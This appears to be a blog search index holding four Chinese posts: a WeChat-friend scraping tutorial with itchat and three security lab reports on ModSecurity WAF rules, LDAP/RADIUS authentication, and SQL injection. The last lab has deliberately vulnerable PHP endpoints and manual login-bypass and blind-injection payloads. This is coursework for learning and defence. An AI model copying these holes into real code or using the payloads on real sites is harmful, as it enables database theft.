<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[利用itchat分析微信社交圈]]></title>
    <url>%2F%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F%2F%E5%88%A9%E7%94%A8itchat%E5%88%86%E6%9E%90%E5%BE%AE%E4%BF%A1%E7%A4%BE%E4%BA%A4%E5%9C%88%2F</url>
    <content type="text"><![CDATA[原文链接：https://mp.weixin.qq.com/s/4EXgR4GkriTnAzVxluJxmg 「itchat」一个开源的微信个人接口，今天我们就用itchat爬取微信好友信息，无图言虚空三张图分别是「微信好友头像拼接图」、「性别统计图」、「个性签名统计图」 「微信好友头像拼接图」 「性别统计图」 「个性签名统计图」 安装1pip3 install itchat 主要用到的方法：itchat.login() 微信扫描二维码登录itchat.get_friends() 返回完整的好友列表，每个好友为一个字典, 其中第一项为本人的账号信息，传入update=True, 将更新好友列表并返回, get_friends(update=True)itchat.get_head_img(userName=&quot;&quot;) 根据userName获取好友头像 微信好友头像拼接图获取好友信息，get_head_img拿到每个好友的头像，保存文件，将头像缩小拼接至一张大图。先获取好友头像： 12345678910def headImg(): itchat.login() friends = itchat.get_friends(update=True) # itchat.get_head_img() 获取到头像二进制，并写入文件，保存每张头像 for count, f in enumerate(friends): # 根据userName获取头像 img = itchat.get_head_img(userName=f["UserName"]) imgFile = open("img/" + str(count) + ".jpg", "wb") imgFile.write(img) imgFile.close() 这里需要提前在同目录下新建了文件夹img，否则会报No such file or directory错误，img用于保存头像图片，遍历好友列表，根据下标count命名头像，到这里可以看到文件夹里已经保存了所有好友的头像。 接下来就是对头像进行拼接 遍历文件夹的图片，random.shuffle(imgs)将图片顺序打乱 用640*640的大图来平均分每一张头像，计算出每张正方形小图的长宽，压缩头像，拼接图片，一行排满，换行拼接，好友头像多的话，可以适当增加大图的面积，具体代码如下： 123456789101112131415161718192021222324def createImg(): x = 0 y = 0 imgs = os.listdir("img") random.shuffle(imgs) # 创建640*640的图片用于填充各小图片 newImg = Image.new('RGBA', (640, 640)) # 以640*640来拼接图片，math.sqrt()开平方根计算每张小图片的宽高， width = int(math.sqrt(640 * 640 / len(imgs))) # 每行图片数 numLine = int(640 / width) for i in imgs: img = Image.open("img/" + i) # 缩小图片 img = img.resize((width, width), Image.ANTIALIAS) # 拼接图片，一行排满，换行拼接 newImg.paste(img, (x * width, y * width)) x += 1 if x &gt;= numLine: x = 0 y += 1 newImg.save("all.png") 好友头像图成型，头像是随机打乱拼接的 性别统计图同样itchat.login()登录获取好友信息，根据Sex字段判断性别，1 代表男性（man），2 代表女性（women），3 未知（unknown） 123456789101112131415def getSex(): itchat.login() friends = itchat.get_friends(update=True) sex = dict() for f in friends: if f["Sex"] == 1: #男 sex["man"] = sex.get("man", 0) + 1 elif f["Sex"] == 2: #女 sex["women"] = sex.get("women", 0) + 1 else: #未知 sex["unknown"] = sex.get("unknown", 0) + 1 # 柱状图展示 for i, key in enumerate(sex): plt.bar(key, sex[key]) plt.show() 性别统计柱状图 个性签名统计图获取好友信息，Signature字段是好友的签名，将个性签名保存到.txt文件，部分签名里有表情之类的会变成emoji 类的词，将这些还有特殊符号的替换掉。 12345678910def getSignature(): itchat.login() friends = itchat.get_friends(update=True) file = open('sign.txt', 'a', encoding='utf-8') for f in friends: signature = f["Signature"].strip().replace("emoji", "").replace("span", "").replace("class", "") # 正则匹配 rec = re.compile("1f\d+\w*|[&lt;&gt;/=]") signature = rec.sub("", signature) file.write(signature + "\n") sign.txt文件里写入了所有好友的个性签名，使用wordcloud包生成词云图，pip install wordcloud同样可以采用jieba分词生成词图，不使用分词的话就是句子展示，使用jieba分词的话可以适当把max_font_size属性调大，比如100。需要注意的是运行不要在虚拟环境下，deactivate 退出虚拟环境再跑，详细代码如下： 生成词云图1234567891011121314151617181920212223242526272829def create_word_cloud(filename): # 读取文件内容 text = open("&#123;&#125;.txt".format(filename), encoding='utf-8').read() # 注释部分采用结巴分词 # wordlist = jieba.cut(text, cut_all=True) # wl = " ".join(wordlist) # 设置词云 wc = WordCloud( # 设置背景颜色 background_color="white", # 设置最大显示的词云数 max_words=2000, # 这种字体都在电脑字体中，window在C:\Windows\Fonts\下，mac下可选/System/Library/Fonts/PingFang.ttc 字体 font_path='C:\\Windows\\Fonts\\simfang.ttf', height=500, width=500, # 设置字体最大值 max_font_size=60, # 设置有多少种随机生成状态，即有多少种配色方案 random_state=30, ) myword = wc.generate(text) # 生成词云 如果用结巴分词的话，使用wl 取代 text， 生成词云图 # 展示词云图 plt.imshow(myword) plt.axis("off") plt.show() wc.to_file('signature.png') # 把词云保存下 句子图 由此看来，一个20多岁程序员小伙的朋友圈满满都是正能量啊，2333。 itchat 除了以上的信息，还有省市区等等信息都可以抓取，另外还可以实现机器人自动聊天等功能，这里就不一一概述了。 具体代码请见https://github.com/HMY626/itchat_wechat]]></content>
      <categories>
        <category>有趣的小程序</category>
      </categories>
      <tags>
        <tag>微信</tag>
        <tag>社交网络分析</tag>
        <tag>性别分析</tag>
        <tag>个性签名分析</tag>
        <tag>头像抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络对抗原理实验三]]></title>
    <url>%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%2F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E4%B8%89%2F</url>
    <content type="text"><![CDATA[网络对抗原理实验三实验环境 Ubuntu 16.04 服务器接口 Apache 2.0 php版本 7.0.30 实验背景知识介绍 ModSecurity（https://www.modsecurity.org/）是开源的Web应用程序防火墙，它可以做为Apache的一个模块使用。ModSecurity可以保护网站防止各种攻击，包括XSS、SQLi、CSRF、DDoS、暴力破解等等。用户可以编写规则实现特定功能。 实验操作安装并配置 ModSecurity 模块，搭建WAF 安装ModSecurity 1sudo apt install libapache2-mod-security2 上面命令会安装ModSecurity模块并自动激活。 ModSecurity安装完成之后还需要创建一个配置文件，可以直接使用默认的配置文件做为蓝本： 1sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf 重启apache2 1sudo service apache2 restart 配置ModSecurity 修改并且启用ModSecurity默认配置 12sudo vim /etc/modsecurity/modsecurity.confSecRuleEngine On 添加CRS（OWASP Core Rule Set), 这是一个提供额外保护的规则集合。 开启CRS规则 1cd /usr/share/modsecurity-crs/ 编辑 1sudo vim /etc/apache2/mods-enabled/security2.conf 引入规则文件，activated_rules目录用来存放激活的规则 12IncludeOptional /usr/share/modsecurity-crs/*.confIncludeOptional /usr/share/modsecurity-crs/activated_rules/*.conf 查看activated_rules目录的README文件获得更多信息。 添加SQL注入保护 1sudo ln -s /usr/share/modsecurity-crs/base_rules/modsecurity_crs_41_sql_injection_attacks.conf /usr/share/modsecurity-crs/activated_rules/modsecurity_crs_41_sql_injection_attacks.conf 开启规则引擎 1sudo vim /etc/modsecurity/modsecurity.conf 将 SecRuleEngine DetectionOnly 改为 SecRuleEngine On 重启apache 1sudo service apache2 restart 实践演示 当我们再次访问实验一中1.html进行万能密码注入时 我们可以看到CRS规则起效果了，它防御住了SQL注入攻击 对特定扫描器w3af的 User-Agent 进行检测和报警，并在单个 IP 访问 数量超过一定门限后对来源 IP 进行封禁。 下载w3af 首先，我是用的是apt安装，但是下载完之后在安装包的依赖关系上会存在一些问题，所以我使用源代码安装。 安装步骤 下载 1234git clone https://github.com/andresriancho/w3af.gitcd w3af/./w3af_console. /tmp/w3af_dependency_install.sh 然后出现了如下的问题 运行 1./w3af_gui 按照提示安装好了后，就可以运行gui了。 对目标进行扫描 扫描结果显示如下 ，所以可以进行sqlmap爆库 现在我们编写过滤规则 这里，我把阈值设置成10，设置时间区间为60秒，即在该段时间内最多发起请求10次。 然后重启 1sudo systemctl apache2 restart 成功！ 另外，我还用了mod_limitipconn模块，这个模块是直接写在apache2.conf中比较麻烦，所以这里就用modsecurity 参考资料 http://www.freebuf.com/articles/web/43559.html]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>ModSecurity防火墙配置</tag>
        <tag>编写规则</tag>
        <tag>对攻击源ip进行封禁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络对抗原理实验二]]></title>
    <url>%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%2F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[网络对抗原理实验二实验要求 用openldap搭建LDAP服务器，尝试对学生信息进行增删改查，信息包括但不限于学生id、密码、 邮箱、手机号、部门等。 配置 apache 服务器，配置 Basic 认证模块和需要认证的页面，使用用户名密码认证。 配置 apache 服务器，配置 LDAP 认证模块和需要认证的页面，使用 LDAP 存放的学生的用户名密码认证。 用freeradius搭建RADIUS服务器，尝试配置基于unix账号的认证，并用radtest验证服务有效。 配置apache服务器，配置RADIUS认证模块和需要认证的页面，使用unix/Linux本地用户名密码 认证。 在freeradius中配置ldap认证模块，和LDAP服务器互通，利用ldap账号密码认证用户身份，并用 radtest 测试通过。 实验环境：Ubuntu 16.04安装并配置ldap安装12sudo apt-get install slapd ldap-utilssudo dpkg-reconfigure slapd Omit OpenLDAP server configuration? =&gt; No DNS domain name? =&gt; example.com Organization name? =&gt; example Administrator password? =&gt; {**} Database backend? =&gt; MDB Remove the database when slapd is purged? =&gt; No Move old database? =&gt; Yes Allow LDAPv2 protocol? =&gt; No Done! 防火墙允许通过ldap程序端口1sudo ufw allow ldap 测试是否安装成功1ldapwhoami -H ldap:// -x 结果如下所示： 输出为anonymous，所以ldap安装成功。 配置ldap 新建一个student.ldif写下如下内容 1234567891011121314151617181920212223dn: ou=student,dc=example,dc=comobjectclass: topobjectclass: organizationalUnitou: studentdn: uid=stu1,ou=student,dc=example,dc=comobjectclass: personcn: 15069130025sn: 15069130025telephonenumber: 18300000000userPassword: student1objectclass: organizationalPersonpostalAddress: XDobjectclass: inetOrgPersonuid: 001dn: uid=stu2,ou=student,dc=example,dc=comobjectclass: personcn: 1234567sn: 1234567telephonenumber: 18900000000userPassword: student2objectclass: organizationalPerson 添加学生信息 添加学生信息 1ldapadd -xWD &apos;cn=admin,dc=example,dc=com&apos; -f student.ldif 查询学生信息 1ldapsearch -xWD &apos;cn=admin,dc=example,dc=com&apos; -b &apos;uid=stu1,ou=student,dc=example,dc=com&apos; 安装与配置apache服务器 安装 123sudo apt install apache2 apache2-devsudo service apache2 restartsudo ufw allow in &quot;Apache Full&quot; 配置Basic认证 1sudo vim /etc/apache2/sites-enabled/000-default.conf 配置如下所示 1234567891011&lt;Directory /var/www/html&gt; Options Indexes FollowSymLinks AllowOverride authconfig Order allow,deny allow from all AuthType Basic AuthName &apos;santu&apos; AuthBasicProvider file AuthUserFile /var/www/html/.valid_user Require valid-user&lt;/Directory&gt; 这里的注释是一会儿配置ldap时需要用到的 建立basic认证的密钥文件 1sudo htpasswd -bc /var/www/html/.valid_user santu &#123;[PASSWD]&#125; 然后访问web 配置apache使用ldap认证 修改apache2.conf 1sudo vim /etc/apache2/apache2.conf 在apache2.conf文件开头中添加这一行导入模块 1Include mods-available/ldap.* 重启apache服务器，加载模块 1234sudo service apache2 restarta2enmod ldapa2enmod authnz_ldapsudo service apache2 restart 我这里已经加载了 接着，修改000-default.conf(就是上文中提到的那个注释),我这里选择这里选择注释掉AuthUserFile密钥文件，如果以后需要恢复basic认证时只需取消注释，并且将AuthBasicProvider后改为file即可 123456789101112&lt;Directory /var/www/html&gt; Options Indexes FollowSymLinks AllowOverride authconfig Order allow,deny allow from all AuthType Basic AuthName &apos;santu&apos; AuthBasicProvider ldap #AuthUserFile /var/www/html/.valid_user AuthLDAPURL ldap://127.0.0.1/ou=student,dc=example,dc=com?uid Require valid-user&lt;/Directory&gt; 重启服务器 1sudo service apache2 restart 现在，就可以用student.ldif中的学生信息进行登录验证了 apache使用freeradius认证 安装freeradius之前先要确保已经安装了mysql、因为后来要用到、没有安装使用apt-get来安装 1sudo apt-get install mysql-server 安装freeradius的部件 1sudo apt install libssl-dev libapache2-mod-auth-radius freeradius freeradius-ldap mysql-server freeradius-mysql 安装完成后freeradius就会自动启动了、由于我们要使用调试模式来启动freeradius、所以先关闭freeradius服务 1sudo service freeradius stop 修改/etc/freeradius/下的users文件 把这几行反注释、也就是使用一个名为steve、密码为testing的用户来测试一下是否通则登录freeradius服务器、保存后退出然后启动radius的调试模式。 注意点一：这里需要补充一点使用ubtuntu的apt-get方式来安装freeradius的位置会和源码不同、源码安装的默认位置是/usr/local/etc/raddb/而使用ubuntu的apt-get方式的配置文件则安置在/etc/freeradius/，我这里是使用apt-get来安装的，所以默认安装位置为/etc/freeradius/ 开启调试模式 1freeradius –X 然后打开另一个终端、使用radtest来测试用户是否能够通过 1radtest steve testing localhost 1812 testing123 注意点：这里的测试就是上述的users文件里面默认的用户名和密码，只在还没启动mysql之前测试有效，而因为我已经启用了mysql中我自己的用户，所以这个就无效了。这句前steve和testing代表用户和密码、localhost和1812则是freeradius的IP地址和端口号、testing123则是freeradius服务端与客户端之间通讯的key、由/etc/freeradius目录下的clients.conf定义、在client localhost字段的secret参数。radtest成功通过后则会显示Access-Accept状态。另外，如果你一个不好运、确实在linux系统中存在steve的用户、这样子的话freeradius服务器则会跳过你现在的用户配置直接去查询系统的配置、这时的密码就会以系统密码为准、这里在users文件中定义的密码就会失效、而且如果改用户是禁止在linux上登录的话、则会直接把用户打回成 Access-Reject 以下是我在mysql中创建了santu用户（下面会说）之后成功的验证 服务器端代码为 mysql与freeradius连接 建立radius数据库 然后建立radius数据库 1create database radius; 之后使用exit退出mysql、然后建立一系统的表格、freeradius已经自带有sql脚本、我们执行这些脚本就可以自行建立了，首先定位到这些脚本所在目录 1cd /etc/freeradius/sql/mysql 导入admin.sql 1mysql -uroot -p[PASSWORD] radius &lt; admin.sql schema.sql同样也是照此格式来执行导入到数据库，如果结果正常的话，可以使用radius账户进入mysql数据库 这里默认密码为radpass这样我们就可以看到一些tables了 配置freeradius 修改/etc/freeradius/radiusd.conf 定位到该行 将其反注释，启动sql.conf 然后编辑/etc/freeradius/sql.conf 默认情况下、使用apt-get命令来安装freeradius会自动检测到已经安装了mysql而自动把database设置为mysql、如果迩的不是这样显示请设置成mysql、然后再再看password这个参数、如果你之前已经更改了radius用户的密码、这里要做相应的修改、其余的参数就默认好了 修改了sql.conf、再设置相应的设备通知其使用mysql作为数据存储设备 把authorize{}字段下的file注释掉、反注释sql、这里的file指的就是usrs文件、将不再把用户信息写在users而使用mysql来存储用户信息 把accounting{} 字段下的sql反注释、启用sql来记录统计信息 把session{}字段下的sql反注释、启用用户同时登录限制功能、这里还需要修改其它地方、一会再说 把post-auth{} 字段的sql反注释、启用用户登录后进行数据记录功能 接下来开启启用用户同时登录限制功能 将这几行反注释 这样整个对mysql的radius配置就已经完成了 测试是否连接成功,在radius数据库建立几条用户信息以测试mysql+freeradius的用户认证是否成功，添上这几句 结果为 这就解释了一开始用radtest santu [**] localhost 1812 testing123命令会出现如下的应答 注意：这些数据类型的属性值attribute都是特定的字符、不是随随便便自己写上去的、要查看定义这些属性的文件请查看迩当前配置文件的dictionary目录、其实里面也啥内容没定义到、只是写上了路径、一般会写上包含在 1$INCLUDE /usr/share/freeradius/dictionary 这里的意思就是整个dictionary文件被放置在这个文件中、其实这个文件也是个路径信息、所以真正定义的dictionary文件是放在/usr/share/freeradius/这个目录、比如Framed-IP-Address属性被定义在dictionary.rfc2865文件中、Cleartext-Password被定义在dictionary.freeradius.internal文件中 注意点：注意之前的freeradius服务必须先停掉、不然会出现冲突、然后再使用以上用户来测试 返回Access-Accept状态的同时会返回相应reply表格的内容、先返回radreply的用户返回信息、再返回radgroupreply的所属组返回信息、返回成功就表示配置已经正确了。 配置freeradius-ldap 配置/etc/freeradius/modules/ldap 这里，apache2使用freeradius进行认证，并且radius和ldap连接，我们使用student.ldif中学生信息就可完成radtest认证。 至此实验二大功告成！]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>openldap配置</tag>
        <tag>radius配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络对抗原理实验一]]></title>
    <url>%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%2F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E4%B8%80%2F</url>
    <content type="text"><![CDATA[网络对抗原理实验一实验要求 搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。 搭建运用的运行环境，如nginx+php-fpm、tomcat+java等等。 编写带有sql注入漏洞的接口程序，包含: 根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名和分数。 根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是否有该学生存在。 根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。 根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。 根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。如输入学号，查询是否有学生存在，然后输出固定内容。 据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数更新。 针对上述各个应用接口，手工修改请求参数，尝试各种 SQL 注入的攻击向量，和正常访问的对照组一 起，观察结果并记录。 针对上述各个应用接口，用 sqlmap 尝试各种注入方式，并用 wireshark 抓包，记录每次的目标、 SQL 命令行、结果(包括出结果的过程、和最终的输出)、和抓包文件。 分析抓包文件，了解攻击向量，体会各种注入技术的原理。并回到 4 步骤中手动尝试。 在步骤3中第一个接口的基础上，尝试用不同的方法来避免SQL注入，再使用sqlmap尝试看是否有效，能否绕过。 实验环境：Ubuntu 16.04实验步骤搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。 进入数据库并且输入密码 1mysql -u root -p 创建数据库 1234567create database test;use test;create table student;insert into student (id,name,score) values (1, 'Tom', 95);insert into student (id,name,score) values (2, 'Jack', 80);insert into student (id,name,score) values (3, 'Mary', 65);insert into student (id,name,score) values (4, 'John', 55); 搭建运用的运行环境:nginx+php-fpm 在线安装Nginx 1sudo apt-get install nginx 安装成功之后，nginx放置在/etc/nginx目录下，并且已经在/etc/init.d/下创建了启动脚本；启动程序文件在/usr/sbin/nginx；日志文件放置在/var/log/nginx目录下，分别是access.log和error.log虚拟主机配置文件放置在/etc/nginx/sites-available目录下；默认的虚拟主机的目录/usr/share/nginx/www。 启动Nginx 1sudo apt-get install php7.0-fpm 在这里，我们使用php-fpm使得PHP7.0可以在nginx上通过PHP-FPM工作，PHP-FPM（FastCGI Process Manager) 是一个守护进程（init脚本文件在/etc/init.d/php7.0-fpm)，它运行了一个FastCGI server，端口是 9000。 配置Nginx 1sudo vim /etc/nginx/sites-available/default 将配置文件中将第39行添加index.htm和index.php使.htm文件和php文件可以成为文件夹默认打开文件，并且反注释57行进行9000端口监听。 reload使配置生效 1sudo service nginx restart 测试 在网站根目录创建一个PHP的测试文件 1sudo vim /var/www/html/info.php php文件内容 打开浏览器输入http://127.0.0.1/info.php 至此nginx已经配置成功 配置php-fpm 1sudo apt-get install php7.0-mysql php7.0-curl php7.0-gd php7.0-intl php-pear php7.0-imagick php7.0-imap php7.0-mcrypt php7.0-memcache php7.0-ming php7.0-ps php7.0-pspell php7.0-recode php7.0-snmp php7.0-sqlite php7.0-tidy php7.0-xmlrpc php7.0-xsl 重启PHP-FPM，使之生效 1sudo service php7.0-fpm restart 编写带有sql注入漏洞的接口程序 以下代码中数据库密码[**]已作脱敏处理，应换成你的mysql root密码 根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名和分数。 html文件如下 12345678910111213&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GET sql injection&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./1.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; &lt;input type="submit" value="submit" name="submit"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件如下所示 1234567891011121314151617181920&lt;?phpif(isset($_GET['submit']))&#123; $id=$_GET['id']; $con=mysqli_connect('localhost','root','&#123;********&#125;'); if($con)&#123; mysqli_select_db($con,'test'); $query=mysqli_query($con,"SELECT name,score FROM student WHERE id='$id';"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); echo "name:".$result["name"]."&lt;br/&gt;"; echo "score:".$result["score"]."&lt;br/&gt;"; $i++; &#125; &#125;&#125;mysqli_close($con);?&gt; 根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是否有该学生存在。 html文件如下所示 12345678910111213&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GET sql injection&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./2.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; &lt;input type="submit" value="submit" name="submit"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件如下所示 1234567891011121314151617181920212223242526&lt;?phpif(isset($_GET['submit']))&#123; $id=$_GET['id']; $con=mysqli_connect('localhost','root','&#123;********&#125;'); if($con)&#123; mysqli_select_db($con, 'test'); $query=mysqli_query($con, "SELECT name FROM student WHERE id='$id';"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); //echo "username:".$result["username"]."&lt;br/&gt;"; $i++; &#125; if($i==1)&#123; echo "yes"; &#125; else &#123; echo "no"; &#125; &#125;&#125;mysqli_close($con);?&gt; 根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。 html文件代码 12345678910111213&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GET sql injection&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./3.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; &lt;input type="submit" value="submit" name="submit"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件代码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpfunction str_rand($length = 5, $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') &#123; if(!is_int($length) || $length &lt; 0) &#123; return false; &#125; $string = ''; for($i = $length; $i &gt; 0; $i--) &#123; $string .= $char[mt_rand(0, strlen($char) - 1)]; &#125; return $string;&#125;if(isset($_GET['submit']))&#123; $id=$_GET['id']; $con=mysqli_connect('localhost','root','[********]'); if($con)&#123; mysqli_select_db($con, 'test'); $query=mysqli_query($con, "SELECT name FROM student WHERE id='$id';"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); //echo "username:".$result["username"]."&lt;br/&gt;"; $i++; &#125; if($i==1)&#123; echo str_rand() . "yes" . str_rand(); &#125; else &#123; echo str_rand() . "no" . str_rand(); &#125; &#125;&#125;mysqli_close($con);?&gt; 根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。 html文件源码 12345678910111213&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GET sql injection&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./4.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; &lt;input type="submit" value="submit" name="submit"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件源码 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfunction str_rand($length = 5, $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') &#123; if(!is_int($length) || $length &lt; 0) &#123; return false; &#125; $string = ''; for($i = $length; $i &gt; 0; $i--) &#123; $string .= $char[mt_rand(0, strlen($char) - 1)]; &#125; return $string;&#125;if(isset($_GET['submit']))&#123; $id=$_GET['id']; $con=mysqli_connect('localhost','root','[********]'); if($con)&#123; mysqli_select_db($con, 'test'); $query=mysqli_query($con, "SELECT name FROM student WHERE id='$id' AND score&gt;60;"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); //echo "username:".$result["username"]."&lt;br/&gt;"; $i++; &#125; if($i==1)&#123; echo str_rand() . "yes" . str_rand(); &#125;#我们这里把没有查到的以及低于60分的都归为no else &#123; echo str_rand() . "no" . str_rand(); &#125; &#125;&#125;mysqli_close($con);?&gt; 根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。例如如输入学号，查询是否有学生存在，然后输出固定内容。 html文件源码 12345678910111213&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;GET sql injection&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./5.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; &lt;input type="submit" value="submit" name="submit"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件源代码 1234567891011121314151617181920212223242526&lt;?phpif(isset($_GET['submit']))&#123; $id=$_GET['id']; $con=mysqli_connect('localhost','root','[********]'); if($con)&#123; mysqli_select_db($con, 'test'); $query=mysqli_query($con, "SELECT name FROM student WHERE id='$id';"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); //echo "username:".$result["username"]."&lt;br/&gt;"; $i++; &#125; if($i==1)&#123; echo "pass"; &#125; else &#123; echo "pass"; &#125; &#125;&#125;mysqli_close($con);?&gt; 据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数更新。 html文件源码 12345678910111213141516&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;database update test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="./6.php" method="GET"&gt; student id:&lt;input type="text" name="id"&gt; student score:&lt;input type="text" name="score"&gt; &lt;input type="submit" value="update" name="update"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; php文件源码 123456789101112131415161718192021222324&lt;?phpif(isset($_GET['submit']))&#123; $id=$_GET['id']; $score=$_GET['score']; $con=mysqli_connect('localhost','root','[********]'); if($con)&#123; mysqli_select_db($con,'test'); $query=mysqli_query($con, "UPDATE student SET score='$score' WHERE id='$id';"); #更新后的结果输出 $query=mysqli_query($con, "SELECT name,score FROM student WHERE id='$id';"); $num=mysqli_num_rows($query); $i=0; while($i&lt;$num)&#123; $result=mysqli_fetch_assoc($query); echo "更新后的结果输出"."&lt;br /&gt;"; echo "name:".$result["name"]."&lt;br/&gt;"; echo "score:".$result["score"]."&lt;br/&gt;"; $i++; &#125; &#125;&#125;mysqli_close($con);?&gt; ###手工注入实验 对于第一种漏洞场景，我们可以使用万能密码&#39; or &#39;1&#39; = &#39;1的方法，将作为参数id通过GET的传参方式拼接到sql语句中。使得数据库查询语句变为 1select name,score from student where id='' or '1' ='1'; 正常访问场景 上述万能密码注入结果可将整个test表输出 这个这种情况属于True or False类型的漏洞，只会返回布尔值而不会返回查询结果，所以我们首先需要猜测数据库名字的长度，接着一个字母一个字母的猜测，根据服务器返回的确认信息，最终确认每个字母。 先判断是否有注入点 是否有整型注入点 是否有字符型注入点 结果都没有 但是我确实是可以进行注入的 究其原因，原来是我在编写第二个php脚本时把所有返回行超过1行的结果都输出no，确实是可以进行注入的 猜测数据库中表的数量 11' and (select count(table_name) from information_schema.tables where table_schema=database())=1# 第一条就显示yes，说明该数据库中表的数量为1 猜测每个表的长度 12341' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1#1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=2#……………………1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=7# 直到当尝试表长是否为7时，返回yes，得出该表长度为7 这里limit a，b #返回第a+1至a+b行的数据 猜测第一个表的表名 123456781' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97# =&gt;true1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122# =&gt;true1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;109# =&gt;true1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118# =&gt;false1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;115# =&gt; true1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117# =&gt; false1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116# =&gt; false1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115# =&gt; true TIPS:substr的用法 一般有两种 SBUSTR(str,pos); 就是从pos开始的位置，一直截取到最后 SUBSTR(str,pos,len); 这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。 猜测第二个字母的时候可以用 11' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;97# 猜测第二个表的第一个字母是可以用 11' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1))&gt;97# 